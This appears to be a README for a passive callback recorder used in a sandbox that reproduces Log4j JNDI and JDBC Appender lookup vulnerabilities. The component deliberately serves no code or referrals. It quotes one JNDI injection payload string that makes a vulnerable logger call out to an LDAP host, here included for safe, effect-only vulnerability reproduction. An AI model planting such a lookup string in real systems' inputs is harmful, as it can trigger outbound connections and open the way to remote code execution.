# Collaborator — passive callback recorder

> Authored but **not live-executed** this pass. Correct in principle; live wiring
> (network attach to the reproducer, port/protocol confirmation) is a TODO for the
> live pass (see repo-root `NOTES.md`).

The controlled collaborator the sandbox runs alongside the reproducers. It is the
**observability sink** for:

- **Case A** — the outbound `${jndi:ldap://collaborator:PORT/poe-<token>}` callback.
- **Case C** — the JDBC Appender's attempt to resolve a DataSource from a JNDI
  name pointing here.

## What it does — and deliberately does NOT do

It listens on a plain TCP socket, **records** each inbound connection (peer, first
packet bytes carrying the JNDI DN / per-trial token, timestamp) to stdout and to
`/records/callbacks.jsonl`, then closes the socket.

It is a **passive recorder**. It is NOT a malicious LDAP server. It does NOT:

- serve a Java class,
- return an LDAP referral that could trigger remote class loading,
- return any code-exec payload.

The outbound network callback is sufficient evidence that the JNDI/JDBC lookup
fired (exploitability). That keeps the proof **effect-only** (RFC 0003 / RFC 0001
inv. 8) — we never weaponize the RCE.

## Protocol choice (LDAP vs plain TCP)

We use a plain TCP recorder rather than a real LDAP server on purpose: a JNDI/LDAP
client and a JDBC DataSource JNDI resolution both **open a TCP connection** before
any protocol handshake completes, so the connection event — with the first packet
bytes that contain the token / DN — is the observable. A full LDAP server is
unnecessary and would edge toward serving referrals (a weaponization path we avoid).

Caveat: some JNDI clients may require a minimal protocol reply to surface the
token cleanly in the first packet. If a live pass shows the connection opens but
the token is not captured, the recorder may need a minimal, **non-referral** LDAP
bind response (still serving no class). Tracked in `NOTES.md`.

## Env

| Var | Default | Meaning |
|---|---|---|
| `COLLABORATOR_BIND` | `0.0.0.0` | bind address |
| `COLLABORATOR_PORT` | `1389` | listen port |
| `COLLABORATOR_RECORD` | `/records/callbacks.jsonl` | JSONL record file |
